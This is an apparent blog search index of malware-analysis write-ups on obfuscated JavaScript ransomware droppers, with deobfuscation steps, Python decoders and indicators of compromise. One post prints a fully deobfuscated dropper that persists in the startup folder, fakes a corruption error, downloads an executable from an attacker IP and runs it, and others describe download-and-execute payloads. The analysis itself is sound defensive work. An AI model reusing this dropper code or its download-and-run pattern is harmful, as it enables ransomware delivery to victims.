[ { "title": "Locky Ransomware Dropper - XOR Encoding, Regex, Scheduled Tasks", "url": "/posts/Locky-Ransomware-Dropper/", "categories": "", "tags": "", "date": "2021-01-12 00:00:00 +0000", "snippet": "Javascript-based Locky Ransomware Dropper that utilises Iterative XOR Encoding, Regex, Scheduled Tasks and registry keys.Locky Ransomware Dropper - Iterative XOR encoding, Regex and Scheduled TasksSummaryThe sample is a piece of obfuscated javascript code, utilising some interesting encoding/obfuscation techniques to hide it’s final purpose of dropping a malicious binary. Once the Iterative XOR encryption and regex has been successfully “reversed”, the payload is revealed to be a dropper for a malicious binary file. Likely, this file is Locky Ransomware (see note below).Although I was unable to connect to the domain to retrieve the binary payload, I was able to find references to the c2 domain in the below writeup by blackberry. Which indicates that it has been used to host and deploy Locky Ransomware.https://blogs.blackberry.com/en/2017/11/threat-spotlight-locky-ransomwareInteresting Notes on the sample: Uses obfuscated variable/function names Customised encoding routine, no base64 or similar Brute forces it’s own function definitions Utilises relatively clean domains for hosting payload Uses registry keys to check for victim current windows version Attempts to use scheduled tasks for execution.Indicators of Compromise http(s)://dboosajqn[.]top/1/ dboosajqn[.]topSource Filehttps://github.com/HynekPetrak/javascript-malware-collection/blob/master/2017/20170321/20170321_d2bdd39119af20dbfc0c1822224b59ba.jsInitial OverviewInitial overview of the code shows a small function that takes an input, and converts it to base16. And another function that contains and returns a large obfuscated string, likely the main payload.Below the main obfuscated string, the following functions can be seen.The Third function looks the most interesting.Since all three “sections” will need to be analysed. I’ll break them up and analyse one by one.Code Piece 1 - Random Character GeneratorThe code from lines 31-35 look like this. Line 33 converts the string into an array, with each array value containing a single letter/char This is done by using regex to extract non-whitespace values (of length 1), using \\S{1]} line 34 grabs a random char value from this array. Using a random number generator.TLDR: This is a random character generatorTake special note of the possible return values, which contain a “+” and “eval”Since we know that kleoonfkcw() is a random character generator, we can ctrl+f and replace all references with “randomChar” or anything similar.The code will now look likeCode Piece 2 - base16 converterOn lines 36-39, we have the following code, which simply uses parseInt to convert an input number to base16 (HEX)Fixing this up, the code will now look like the following.Section 3 - De-obfuscation RoutineBased on below, this function serves as the primary de-obfuscation routine for the giant string declared previously in the code.TLooking closely, we can see where the obfuscated string ends up going.In order to make more sense of the function, I took it out of the string and put it into a new doc.Which looks like this. Note the references to randomChar(). Which will populate the function logic with a value from “yvla+e_”It’s not very obvious at first glance, but this will eventually populate the values with “+” and “eval”Thus creating a “+=” on line 6, and “eval” on line 9.Since the function is being defined dynamically inside of an infinite loop, eventually the values will line up below, allowing the code to execute.Cleaning up a bit more, the de-obfuscation code looks like this.With functions and variables renamed, looks more like this.The logic above is fairly simple, and can be recreated as a python script below. Alternatively, the code could easily be executed with a print/echo within javascript, but I like to use python.De-obfuscation Script - Payload ExtractedThe output is a bit messy, so I used cyberchef to add some newlines/spacing for readability.I then moved it into vscode, since I like the interface and highlighting better.See below for a quick snippet.Analysis of Final PayloadLooking at the final payload, it can be seen that the malware uses XMLHTTP objects for sending http requests and retrieving the final binary payload.Below we can see the URL/Domain where the malware is retrieved from.Below we can see that the malware gets the location of the current users temp folder, and generates a 7 digit filename for the dropped binary.Below it can be seen that the malware does a few interesting things. Checks the registry, to make sure that the victim PC is running windows 6.0 (Vista) or above Attempts to create a scheduled task to execute the malware Interestingly, only sets the malware to execute once (based on the /sc once) parameter Names the task a 7 digit value, eg 3482888. Doesn’t try to masquerade as something legitimate. Uses the previously grabbed time value to execute the code at current time + 2 minutes. If the scheduled task creation fails, launches the malware directly using cmd.exeAnalysis of Malware Domain/IOCBelow we can seeAlso interesting is that the domain itself is relatively clean.The domain is also mentioned in this writeup of Locky Ransomware. Indicating that Locky Ransomware could be contained in the dropped binary payload.https://blogs.blackberry.com/en/2017/11/threat-spotlight-locky-ransomware##Python Script#Python Script used for decoding, slightly modified from the previous screenshot#Mostly just changes for readabilitybad_code = \"9228379b1840edabf&lt;&lt;SNIPPED&gt;&gt;adfaa82a4bfbdf104f2c30badf7d7bd8435af6e5f95d41352d938877a573744c1a46c08caaedf37f18b8d1325b3670b897303dd60951e7e5f41e4a662b879457ec3c314e014bc494b1a1b37516b39e144d3078b2912f2b971e00a2bea600173c649b9b0af7\"#array of integers used for XOR operationsArr1 = [244,93,89,248,108,41,130,197,219,125,106,21,95,230,230,35,204,30,17,101,33,59,165,224,217,136,136,8,107,208,255,96,46,88,88,154]#extracts hex values from the main string, stores them as a list#The \\S{2} will extract all non-whitespace values of length twoHex_Values = re.findall(\"\\S{2}\", bad_code)result = \"\", counter1 = 0, counter2 = 0#while loop that recreates the de-obfuscation logicwhile (counter1 &lt; len(Hex_values)): #resets the XOR array if loop has reached the end if (counter2 &gt;= len(Arr1)): counter2 = 0 #XORS the extracted hex value, with a value from the XOR array num = int(Hex_Values[counter1], 16)^Arr1[counter2] #returns the ascii value of the XOR result result += chr(num) counter1 += 1 counter2 += 1print(result)" }, { "title": "Mordor Ransomware Dropper - Obfuscated Javascript with Hidden Payloads", "url": "/posts/Mordor-Dropper/", "categories": "", "tags": "", "date": "2020-12-27 00:00:00 +0000", "snippet": "Javascript Malware Dropper that retrieves and executes a Mordor Ransomware payload. Utilises a few basic anti-automation techniques.Mordor Ransomware Dropper with Multiple Layers on EncodingSummaryThe sample is a piece of obfuscated javascript code that retrieves and launches/executes a malicious executable from an attacker controlled server. The code utilises a few simple anti-sandbox techniques, and is well obfuscated in that all malicious commands are not visible in the initial code, and require successful reverse-engineering of the decoding routine in order to analyse.Based on the below article and analysis of the attacker controlled domain, the file was likely used to retrieve Mordor Ransomware.https://www.malware-traffic-analysis.net/2017/05/02/index.htmlIndicators of Compromise IOC’s IOC Severity kingzoneg[.]top/admin.php?f=404 High %TEMPLATES%\\d{4,6}.exe$ High kingzoneg[.]top/admin.php High kingzoneg[.]top Medium 47.91[.]93.208 Medium 47.91[.]93.208/admin.php High Source FileThe javascript file is from the HynekPetrak Javascript Malware Collection.https://github.com/HynekPetrak/javascript-malware-collection/blob/master/2017/20170501/20170501_018edd4b581516682574e305c835c5c9.jsAnalysisThe code starts with a few variables created by concatenating/combining lots of small strings. This makes the code slightly more difficult to read, but is trivial to fix and remove.There is a small function that appears to be a simple decoding routine. Although it breaks up the string into an array before rejoining, the code is essentially a search and replace.There are a few variables where the results of the decoded strings are stored, and some variables that store the results of those decoded strings being executed via eval.The code finishes with two eval statements, both on the results of decoded strings. Interestingly, the second eval performs the decoding twice, and also performs a check against a value not present in the initial code. Likely, this checked value is defined in one of the obfuscated strings and eval statements.Reverse EngineeringNow that there’s a general understanding of the malware structure, the code can be analysed and decoded using cyberchef.First job is to fix up the “broken” strings, this can easily be done using find/replace and regex. \\+? looks for plus signs at the beginning or end of the line [”’] Looks for starting and ending quotes \\+\\n looks for a plus sign followed by a newline \\+?Which can now be copy/pasted into vscode in a much more readable format.(Note that you can ctrl+shift+p, change language mode, javascript - to enable highlighting without saving as a fileNow it’s time to rename some functions and variable names, anything that makes sense will do.The results *could* look like this.Manual Decodingbad_string1Bad_String1For bad_string1, the value “ynXYUuwtAvWkxfpMbeqGZTrgFNVHmL” is used as a delimiter to create an array, the array is then concatenated back into a string, with a blank value used to join the values.Despite the use of arrays and joins, the routine is essentially a search and replace.Cyberchef can be used to decode the string.Observing the output, we can see that the code creates some activexobjects for executing shell commands and interacting with the filesystem.After this, the code checks if the hardcoded value “qxkFASizeYvpD1TcG” exists as a folder on the system. Not entirely sure what this is, but I think it may act as a basic protection against automated sandbox analysis, since the final payload will not execute if the value is true, and many sandboxes may provide dummy values in order to “satisfy” the code.See below that this value is later used to decide whether to execute a string, presumably the final payload.bad_string2bad_string2 only appears once in the initial code, it does not appear to be referenced anywhere else.Either it is junk code used to throw off analysis, or the value is used later by code contained in one of the obfuscated strings.bad_string3the bad_string3 decoding routine looks extremely similar to the routine for bad_string1.Using the same find/replace style approach used in bad_string1, the following payload was retrieved. Interesting, it references values obtained from bad_string1, and appears to use them to decode bad_string2, using a different routine to that used for bad_string1 and 3.Based on the above, it looks like bad_string2 is an obfuscated registry key. The rest of the code seems to use the previously defined wscript.shell object to check the value of a registry key, and then retrieves the second character of the resulting registry key value.The registry key is contained within the bad_string2 variable, so it must be decoded to find out what key is being checked.Decoding bad_string2Whats interesting, is that this doen’t even retrieve the “C” value as you might expect, it actually retrieves the “:” colon value.bad_string4Based on the above notes, there needs to be two rounds of decoding for bad_string4. One round where “:” is replaced with “%”. One round where the “kpXvqnzVlFrDNceAHYhufwCxPUsiJo” value is replaced with “e”Now note that the end result contains url encoded characters. So these will need to be removed to extract the final payload.For readability sake, I’ve copied the output (between the quotes) into a new cyberchef window.The decoding was successful, and the final payload has now been extracted.Final Payload AnalysisThe final payload is an executable malware dropper. It utilises: shell objects to execute shell commands on the system XMLHTTP Objects for performing HTTP queries ADODB.Stream objects for interacting with the resulting HTTP Streams The “templates” special folder for saving the dropped executable math.random for generating random executable namesVirustotal Analysis of Domain/IOCThe exact URL has 5/66 detections on virustotal, and was first observed in May 2019.Interestingly, the domain itself only has 3 detectionsThere are quite a few subdomains. All resolving to IP’s owned by AliBaba." }, { "title": "Carbanak Ransomware Dropper - Obfuscated Javascript with Hidden Powershell Payload", "url": "/posts/Karbanak-Javascript/", "categories": "", "tags": "", "date": "2020-12-20 00:00:00 +0000", "snippet": "Malware dropper that uses obfuscated javascript to execute powershell commands and drop a Carbanak ransomware payload.Carbanak Ransomware Dropper - Javascript with Hidden Powershell PayloadSummaryThe file is a well obfuscated piece of javascript, which contains a hidden and obfuscated powershell payload which calls out and downloads an executable binary.The attackers site where the binary is retrieved from has been retired so the dropped executable was not able to be analysed, however the filename of “kar.exe” indicates that it could be related to carbanak ransomware. Although this is just a guess.IOC’sURL http[s]://securityservice[.]press/File \\uhop[.]exe kar[.]exe %TEMP%\\uhop[.]exe %TEMP%\\kar[.]exeOverview &amp; Source FileFile Comes from here.https://github.com/HynekPetrak/javascript-malware-collection/blob/master/2017/20170228/20170228_95ef28504dfe6e162999278eb8e4afc6.jsAnalysisInitial analysis of the code shows lots of obfuscated function names, usually taking in a variable that never gets used, and returning an array containing “Number.NaN” (Essentially a none-type, junk) and a string that looks to contain code.using control+f to see where the functions are called, we can see: The function parameters are junk and never used. The string contained in the return array of each function is used to build a larger block of code, presumably the malware payload. The function calls reference the string in the array returned by the function, always skipping over the “Number.Nan” bits. The “Number.Nan” bits serve no purpose, other than to obfuscate the code.Now comes the annoying part, search+replace to de-obfuscate the code and re-construct the payload. Note the regex query of “varname(\\d)[\\d\\]” so that the entire reference is replaced, and not just the function name.In the end, I got bored of the repetitive-ness of search and replace. So I decided to take a different approach.I used cyberchef and regex to convert the functions to standard variables.See below the original function calls, which now reference the “standard” variables made above. This is so that the variables can be pasted into an online javascript interpreter, with a console.log statement to retrieve the value of “iwep” where the payload is stored.It should look something like this.Which retrieves a powershell payload of:Let’s leave this for now, and go back to de-obfuscating the code surrounding the payload.Below I’ve placed some notes, indicating what the value names are going to be. You can easily find out what the variable will become, by selecting it and pressing “ctrl+f”, which will take you to the line where the variable was defined.Given that the main payload had already been resolved, I decided to just do the rest by hand. Good old fashioned “select a value, ctrl+f, find original value, then search and replace”After about 5 minutes, I was left with this.Looking at the above, we can see that: A file system object is created, which is later used to check that the malware is running out of the “C:” drive. A dynamically generated function is created The function creates a wscript.shell object (used to execute shell/cmd commands on the host machine) The function uses previously defined values to create a powershell command. The function then uses the wscript.shell object to execute the powershell command.This all looks pretty standard and un-interesting. The juicy stuff is going to be in that powershell command.Decoding the Powershell PayloadGoing back to the powershell payload that was retrieved earlier.We have something like this.There are two “safe” ways to de-obfuscate the payload. Classic search-and-replace using vscode or notepad++ (or any other editor of choice) This is the “static” style approach, and is much safer, although very time consuming. Execute the code dynamically, replacing any execution related functions with print/echo/log statements. This is generally safe, as long as you are diligent and remove all execution-related functions. You could also run in a sandbox/VM, either your own, or an online one.https://tio.run/# is a good online sandbox for extracting powershell.Below, I have pasted the code into tio.run, an online powershell sandbox.The invoke-expression has been replaced with an echo, so that the payload will be printed to the console rather than executed.Which leaves this payload. In theory, this will execute fine, but it’s not very nice to read.This is much nicer to read.Final Payload + IOC’sHere is the final payload, extracted from the powershell, which was extracted from the javascript. Sets the execution policy to bypass, which allows the execution of saved scripts and code. Retrieves an executable from “http[s]://securityservice[.]press/kar.exe” saves it to the temp folder as “uhop.exe” executes the downloaded file.VirusTotal AnalysisLooking at the IOC URL in virustotal, only 6 engines have marked it as malicious.More interesting, is that the domain has been marked as completely clean." }, { "title": "Cerber Ransomware Dropper - Custom XOR routine with Regex, XOR and many charcodes", "url": "/posts/Cerber_Ransomware_Dropper/", "categories": "", "tags": "", "date": "2020-11-21 00:00:00 +0000", "snippet": "Malware dropper utilising some interesting custom routines for obfuscating a final payload. Regex, XOR and charcodes.Cerber Ransomware DropperSummaryThe sample is a well obfuscated javascript file containing a large and heavily obfuscated string. Analysis of the base code indicates a custom decryption/decoding routine that extracts a primary payload. Once extracted, the code calls out to an attackers server and retrieves a malicious executable binary.Analysis of the attackers domain using virustotal indicates that it once hosted cerber ransomware.The decryption routine utilises regex to extract hex values from an obfuscated string, which then undergo a interesting brute force and XOR operation to produce a second set of hex values, corresponding to ASCII characters. Once properly extracted, the second set of ascii values make up a payload that retrieves and loads a malicious binary.Source FileThe sample can be found here, in the HynekPetrak Javascript malware collection.Initial AnalysisAnalysis of the source file shows that it consists mostly of one large obfuscated string.Below that, there are some obfuscated function names, and a reference to a regex query.In order to make any sense of this, I first focused on the large obfuscated block. I removed the joining plus signs and attempted to decode it using any common methods (base64, hex etc), but this was not of any success.Then I removed the block, and focused on the surrounding code, in order to get an idea as to how it is used.This made me realise that the obfuscated block, is actually passed into another function later on in the code. Presumably, this second block where the code is passed, will contain the de-obfuscation routine.Adding some newlines for readability, this is where the obfuscated string ends up going. Note that there is an interesting regex function in there.Rather than reading the obfuscated code, I took a guess at what the variable names might be, and used vscode search/replace to fix them up.Note that the “getRandomChar()” function, is referencing this code previously defined in the function. Which seems to return a random character from the array in the function.At first, I thought these were just a bunch of meaningless characters, but eventually I realised that the possible values contain an XOR operator ^, and all the characters required to spell out “eval”. This will make more sense later.On each iteration of the whole while loop, a random set of characters from the “getrandomchar” array will be returned to the “getRandomChar()” function calls.From what I can tell, these are truly random, which means that on most iterations, the function will be invalid. Eg when it becomes “peva(result)” and “p86”. When this happens, the function will gracefully fail, and the error will be caught by the “catch(er)” statement.Then, the loop will iterate again and try the next set of random characters. Eventually landing on “^86”(XOR 86) and “eval(result)”. Which will successfully decode the obfuscated string and execute the resulting code.Taking into account all of the above, the decryption routine does the following: Uses regex to grab substrings of length 7, from our original large obfuscated block. Initiates an array to store the substrings. Uses a while loop to iterate through the substrings and: Extract the last 2 characters of each 7 length substring (if done properly, these will all be valid ascii char codes) Converts the extracted ascii char codes into decimal integers. XOR’s this integer with the decimal 86 Converts the XOR’d result into ASCII. Saves the result into a buffer Executes the buffer Manual DecryptionI first copied the large obfuscated string into regex101, in order to test my theory about the 7 char strings and the last two values.These were the results, which confirmed the idea that the extracted values could be ascii char codes.I then used cyberchef to extract the charcodes, using the same regex as used in regex101.Note that I used three recipes, To remove whitespace for easier reading To remove the plus signs and create one large string (instead of multiple concatenated strings) Uses regex and find/replace to extract the final charcodes using capture groups. Note the final regex query is (\\S{5})(\\S{2}), which utilises two capture groups. Were only interested in the second one, hence the $2 in the replace value. Alternatively, you could also make it “$2\\n” in order to have newline’d output.I then tried to XOR this output using cyberchef, but for some reason it didn’t work. It looked like cyber chef was trying to XOR the entire output as one piece, as opposed to XOR’ing each individual charcode.So instead, I decided to copy the output into a text file, and use a python script to perform the XOR operation.I was able to devise the following python script.Which when executed, produced the following output. If you look closely, this looks like valid javascript code (success!).So I copied and pasted the above output into cyberchef for round 2.Second Round of De-obfuscationI copied the output into cyberchef, and then used the “generic code beautify” and “syntax highlighter” functions to make the code more readable.Most of the code looks fairly standard, MSXML objects for url retrieval, and activexobjects for code execution and access to deeper (than standard javascript) functionality.If you look at the highlighted boxes, you can even see the attackers servers and extract them as IOC’sBased on the above and below, we can tell that the file’s primary function is to retrieve a malicious executable file.We can also see the use of the math.random function for naming the file, so it won’t have a predictable filename that can be used as an IOC. We can also see that it intends on saving the file to the windows temp folder.Eventually, we get to the end of the code, where we can see the use of wscript to access windows shell functionality, and utilise cmd.exe to execute the dropped payload. Interestingly, it also tries to delete the source .js file, as well as any other js files in the directory.Analysis of IOC DomainsInterestingly, the domains don’t have that many detections on virustotal.Python ScriptHere’s a copy python script I made for extracting the second payload.import reimport sysf = open(sys.argv[1],\"r\")data = f.readlines()for line in data: if len(line) == 0: continue line = line.strip() x = int(line,16) x = x^86 print(chr(x),end=\"\")" }, { "title": "Teslacrypt Malware Dropper with IOC Extraction", "url": "/posts/TeslaCrypt-Malware-Dropper/", "categories": "MalwareAnalysis", "tags": "malware, javascript", "date": "2020-11-20 00:00:00 +0000", "snippet": "Reverse engineering a basic javascript malware dropper that retrieves a Teslacrypt payload.TeslaCrypt Malware Dropper20170318_3170ec01a7c33215b9b942e6679208b0.jsSummaryThis sample is a lightly obfuscated javascript-based file, containing a malware dropper that calls out to malicious domains and attempts to download and execute additional malware. The malware utilises some basic string obfuscation techniques to hide it’s true intentions from prying eyes.Analysis of the malicious domains on reputation sites, indicates that this malware has been used to deliver teslacrypt malware payloads. As the sites have now been retired, I wasn’t able to confirm this 100%. Language: Javascript Purpose: Malware Dropper, Likely TeslacryptIndicators of Compromise http(s)://yst[.]orlyreznik.com/counter/ http(s)://palmspringsevents[.]net/counter/ http(s)://steelglossary[.]com/counter/ http(s)://beautifulreflections[.]purepointdesign.com/counter/ http(s)://haveniconnect[.]com/counter 0000001DXLHkdSCS58A5mM2BLdw6qY11awCXB5PvrWsE9pDQhl3oXM2EbbN7Gbi455btxEyEwYyWKA4UmxvZDCPQS4LmFR_XtZZWu3A-_bHkd8Yn2fw Any reasonably long substring of the above value ^^Source FileSource file can be found in the HynekPetrak Javascript Malware CollectionFile OverviewPrior to any de-obfuscation, the code is already reasonably simple to understand. It’s even pre-formatted and spaced. There are a few broken up strings, and variables values are not directly referenced (as always with malware) but these are easy to overcome.Plan of Attack Remove the plus signs to reconstruct value names Use search/replace to resolve variable names Analyse resulting code Pull IOC’sAnalysisUsing cyberchef, I was able to use the following find/replace recipe to remove the plus signs. Note that I also included quotes on either side, so that the + signs would only be removed when between two strings. (and not between two variable names)Now that the plus signs have been removed, the code is slightly more readable. It’s now much easier to read the “MSXML2.XMLHTTP” value, and the “GET” value. There are still some plus signs, but these correspond to variable names, so we will need to do a search and replace to retrieve these values.Although you can use cyberchef, I like to use a text editor to do my search and replace. I use vscode, but notepad++ or any other editor works well too. As we resolve variables, it’s also a good idea to give new names to other variables along the way. Anything that infers the meaning of the variable will work fine, you can always change them later if more information is uncovered.Below is the search and replace function within vscode.After completing all of the search and replace queries, I was left with the following.In the above code, there are two main points of interest. The first red box, which contains the lines of code where the final attacker URL’s are constructed. the second red box, which contains the line of code that “extracts” the final payload retrieved from the attackers server. Which is then executed via and eval statement. Note that these servers were down when I analysed this malware, so I was not able to extract the final payload that would have been contained. Final Code - w/CommentsAutomated Analysis - Box.jsAutomated analysis with box.js provides similar IOC’s to the ones extracted manually.Indicators of Compromise http(s)://yst[.]orlyreznik.com/counter/ http(s)://palmspringsevents[.]net/counter/ http(s)://steelglossary[.]com/counter/ http(s)://beautifulreflections[.]purepointdesign.com/counter/ http(s)://haveniconnect[.]com/counter 0000001DXLHkdSCS58A5mM2BLdw6qY11awCXB5PvrWsE9pDQhl3oXM2EbbN7Gbi455btxEyEwYyWKA4UmxvZDCPQS4LmFR_XtZZWu3A-_bHkd8Yn2fw Any reasonably long substring of the above value ^^" }, { "title": "Javascript Malware Dropper", "url": "/posts/19360611_23f5eaf84cedb0998e31b34a5f81e4ef.js/", "categories": "", "tags": "", "date": "2020-11-19 00:00:00 +0000", "snippet": "Reverse engineering a well obfuscated javascript malware dropper that retrieves a malicious binary payload.19360611_23f5eaf84cedb0998e31b34a5f81e4ef.jsSummarySample is a reasonably well obfuscated piece of javascript containing malicious code that attempts to evade automated detection, and then downloads a malicious binary onto the victims computer.Affected Devices Windows Devices Running Internet ExplorerPrimary Function Downloads and executes a binary file from the windows temp folderOverview Deletes original js file and moves to temp folder Lots of obfuscation Pretends to be corrupted, but actually sleeps and continues execution Downloads a malicious binary using activexobject Binary name is randomised every time Checks that the retrieved file is an MS-DOS binary (exits if check fails) Executes Malicious binary Cleans itself up, deletes original js and retrieved binary Resets variable values to junk values after execution, making it somewhat harder to auto analyse Need to put breakpoints before variables are reset/scrubbed Anti-Analysis Tactics Heavy Obfuscation Moves original javascript file Multiple Sleep Functions (May help evade automated sandboxes with timeouts) Checks that the retrieved file is an ms-dos executable, and not a dummy file provided by the operator/sandbox. Deletes itself and cleans up, leaves no files on disk if execution completes Resets variables after use, so that breakpoints have to be more carefully set.Source FileLooking at the files contents, it mostly looks like this. values are assigned in an array, and are then immediately referenced for use. Mostly just makes it harder to read.De-ObfuscationThere are a few things to deal with, before we can get into the real analysis Get rid of the unicode escaped characters eg the “\\u0080” style stuff Get rid of the arrays, so that we are just left with the referenced value. Eg get rid of all the “{eci3:’\\u0018”}” Style stuff Removing UnicodeUsing cyberchef, remove the unicode characters with the “unescape unicode characters” function.This successfully gets rid of the unicode, as can be seen belowRemoving the array obfuscationI was able to remove the weird arrays using the following find/replace recipe, in combination with some regex. This captures the entire array and reference, and then replaces it with the assigned value within the array. the “$1” references the 1st capture group within the regex.There is now a semi readable script, and we can start to see the beginning of some IOC’sMaking the code readableThe leftover code is quite a mess, I like to use a code-beautify to add some useful whitespace. There is another code beautify for javascript, but for some reason it tends to break on javascript malware. The Generic version seems to work fine.Now the code looks much nicer, and we can start to get a feel for the “flow” of the code.Also note that we have a clear IOC within the code.Search and ReplaceThe code is now fully readable, however, it’s difficult to fully understand since there is still one layer of obfuscation. See below for what I mean.The best way to deal with this, is to manually do a search and replace in your favorite editor, notepad++ and visual code work great for this.This is quite a slow and somewhat painful process, but is a necessary step in de-obfuscating javascript code.You could try to script this, but it’s a painful process. Be prepared to write some chunky regex. I was able to get a semi-functioning script, but ended up doing it manually due to inconsistencies in the script output. I’ll include a copy of it somewhere.Final De-Obfuscated Scriptobj_more = null;obj_considered = null;obj_packages8 = null;obj_better = null;obj_Accuracy = null;obj_alike1 = null;obj_large = null;obj_running1 = null;obj_capture5 = null;obj_servers105 = null;obj_they7 = null;obj_size = null;var ActXN = this[ActiveXObject];var WSSS12 = this[WScript];var obj_complex2 = WScript[CreateObject](WScript.Shell);var fso12 = new ActiveXObject(Scripting.FileSystemObject);var obj_informationsensing = new ActiveXObject(ADODB.Stream);var obj_trends6 = new ActiveXObject(Shell.Application);var temp12 = WScript[CreateObject](WScript.Shell)[ExpandEnvironmentStrings](TEMP);var obj_medicine = temp12 + Mathfloor((Math[random]() * (100)) + 1) + .exe;#let's assume the above resolved to \"*windows/temp*/23482819.exe\"var obj_time = new ActiveXObject(Msxml2.ServerXMLHTTP);var body12 = \\aflash_update.js;var startupFolder = ActiveXObject(Shell.Application)[NameSpace](7);var flagme = false;var obj_including = false;var obj_lead9 = 1;var filets = null;var empty12 = '';var obj_systems7 = WScript[ScriptFullName];var autor = startupFolder.Self.Path + \\aflash_update.js;var attacker_url = https://217[.]28.218.217/AE5600FFCBCC/q64.php?add=gtyhbncdfewpnjm9oklmnfdrtqdczdfgrt;if ((WScript[ScriptFullName] != autor) &amp;&amp; (false == false)) { #Malware copies itself to new file named \"\\aflash_update.js\" #Then removes original copy and sleeps false = true; ActiveXObject(Scripting.FileSystemObject)[CopyFile](WScript[ScriptFullName, autor); ActiveXObject(Scripting.FileSystemObject)[DeleteFile](WScript[ScriptFullName); WScript[echo](The document is corrupted and cannot be opened); WScript[Sleep](8000);}while (true) { 1 = 1 + 1; if (1 == 200000000) { while (true) { try { #sets up object to download malware file ActiveXObject(Msxml2.ServerXMLHTTP)[setOption](3, MSXML); ActiveXObject(Msxml2.ServerXMLHTTP)[open](GET, attacker_url + &amp;123456.exe, false); ActiveXObject(Msxml2.ServerXMLHTTP)[send](); if (obj_time[status] == (200)) { if (ActiveXObject(Scripting.FileSystemObject)[FileExists](windows/temp*/23482819.exe)) ActiveXObject(Scripting.FileSystemObject)[DeleteFile](*windows/temp*/23482819.exe); ActiveXObject(ADODB.Stream)[Open](); obj_informationsensing[Type] = 1; ActiveXObject(ADODB.Stream)[Write](ActiveXObject(Msxml2.ServerXMLHTTP)[responseBody]); obj_informationsensing[Position] = 0; ActiveXObject(ADODB.Stream)[SaveToFile](*windows/temp*/23482819.exe); ActiveXObject(ADODB.Stream)[Close](); filets = ActiveXObject(Scripting.FileSystemObject)[GetFile](*windows/temp*/23482819.exe)[OpenAsTextStream](1); if (ActiveXObject(Scripting.FileSystemObject)[FileExists](*windows/temp*/23482819.exe) &amp;&amp; filets[ReadLine]()[substring](0, 2) == MZ) { #above checks that downloaded file is a binary false = true; #execute malicious binary ActiveXObject(Shell.Application)[ShellExecute](*windows/temp*/23482819.exe, '', '', open, 1); #deletes malicious javascript file if (ActiveXObject(Scripting.FileSystemObject)[FileExists](WScript[ScriptFullName])) ActiveXObject(Scripting.FileSystemObject)[DeleteFile](WScript[ScriptFullName]); WScript[Sleep](4000); #deletes malicious binary file if (ActiveXObject(Scripting.FileSystemObject)[FileExists](*windows/temp*/23482819.exe)) ActiveXObject(Scripting.FileSystemObject)[DeleteFile](*windows/temp*/23482819.exe); } null[Close](); } } catch(e) {} if (obj_including == true) { break; } WScript[Sleep](70000); } break; }};obj_doubled = 204;obj_cameras5 = 0.328;obj_data = 0.231;obj_data = 0.559;obj_that1 = 87;obj_hundreds9 = 0.797;obj_months4 = 0.66;obj_predictive4 = 522;attacker_url = 426;obj_moving7 = 481;obj_hundreds1 = 442;obj_capacity1 = 0.447;;Indicators of Compromise (IOC’s) http[s]://217[.]28.218[.]217/AE5600FFCBCC/q64.php?add=gtyhbncdfewpnjm9oklmnfdrtqdczdfgrt flash_update.js" }, { "title": "Javascript Malware Dropper", "url": "/posts/20170507_0d258992733e8a397617eae0cbb08acc.js/", "categories": "", "tags": "", "date": "2020-11-18 00:00:00 +0000", "snippet": "De-obfuscating a nicely obfuscated javascript malware dropper. Utilises registry key checks, and a bit of math.SummaryThe sample is a well obfuscated javascript file, utilising multiple rounds of simple, but custom encoding routines.After successful decoding, and some very basic sandbox checks, the file uses wscript and activexobjects to call out to an external server and download/execute a malicious executable.Likely, this executable contains ransomware.TLDR: the file is a malware droppperSource FileThe malware file can be found in the Hynek-Petrak malware collection. File path is as follows.First LookNote that regex expression utilised is the value of the variable passed into the function.From the above code, we can see that the string value observed above, is eventually “cleaned” using regex, and is then passed into an eval function by the code. Resulting in execution of whatever code is inside.After that, we can see some other obfuscated code and an eval statement, suggesting that there is a secondary payload located somewhere within the code. I will first focus on de-obfuscating the first obfuscated code block, and then look into de-obfuscating the second.First Payload ExtractionSince we can see the key used to de-obfuscate the function, and we can see that it’s nothing more than regex, we should be able to do some solid de-obfuscation using cyberchef. Alternatively, any other code editor with regex find/replace will do.Copy and pasting the obfuscated string into cyberchef, should look like this.Now, I used the following find/replace recipes to clean up the code. The first one removes any newlines and any plus/quote signs. The second performs the regex expression used by the code. (Eg removes the “KAxegJjd0f” string) The third simply beautifies the code a bit, adding in new lines and spacing for readability. After both of these, we can begin to see some functioning javascript code.Copy and pasting the resulting output into visual code, we get this. Without doing any additional analysis, we can note a few things. the code utilises activexobjects and Wscript. Most likely to exeute shell commands. the instantiates a filesystemobject, implying that it is going to intereact with the file system in some way. Possibly to modify, read, of drop a file. Just by looking at the human-readable components of the code, we can infer the following.We can use that information to infer some meaningful function names.(Note that you can ctrl+f to see how often a value has occurred, and also to do search and replace)Second Payload ExtractionNow that the first payload has been de-obfuscated, we need to de-obfuscate the second. (By second, I’m referring to these last few lines of code)It should look like this, after enabling highlighting and adding a few newlines for readability.Some notes on whats left. Before I go and start renaming.After renaming values based on what they look like they do, and also based on values determined in payload one.This actually looks pretty interesting, there seems to be a few measures in place to thwart analysis, or just to target specific systems, works both ways. For one, the code is stored in a large messy string, as we already know. On line 17 - We can see that the decoding routine is dependent on the windows version number. I’m assuming this is mainly a means of targeting specific systems, but it could also be used to thwart analysis. Since the code will not fully execute if the analysis environment is not the intended windows version. Since we have no idea which version its intended to be, we’ll need to brute force using the most common values. This shouldn’t be too bad, given that there aren’t that many windows versions. On line 19, theres a check that the registry key exists AND a check that the “version number” is not a folder I suspect these are to thwart tools that automatically respond with fake registry values. Similar to inetsim. After quite a lot of tinkering around, I was able to come up with the following python script.Which produced this output (after a LOT of failed attempts, due to my interpretation of the “get_windows_version” looking function)The issue I hadEg the value used in the de-obfuscation function is the charcode of “:”, and not an integer/number stemming from a windows nt version number.De-obfuscation of final payloadNow that we have the final payload, in fairly readable text. We can return to cyberchef for final decoding.I was able to complete this using the following recipe.Finally, we have decoded the final payload, and can extract the indicators of compromise.Cleaned up with highlighting and comments, this is the final payload.We now know the code is a malware dropper!" } ]
